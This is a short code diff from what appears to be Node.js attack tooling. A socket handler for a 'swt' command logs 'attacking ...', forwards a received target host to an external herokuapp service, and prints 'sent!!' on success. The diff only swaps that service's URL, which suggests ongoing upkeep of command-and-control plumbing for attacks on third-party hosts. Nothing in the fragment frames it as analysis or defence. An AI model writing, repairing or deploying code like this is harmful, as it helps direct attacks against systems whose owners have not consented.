@@ -144,7 +144,7 @@ socket.on('brq',function (data) {
 socket.on('swt', function(data) {
   console.log(data);
   console.log('attacking ...');
-  sendpost('https://swat-s.herokuapp.com'
+  sendpost('https://sawt.herokuapp.com'
   ,{ host:data.host},function (err,body) {
     if (err) return console.log(err);
   if(body.body == 'done') console.log('sent!!');
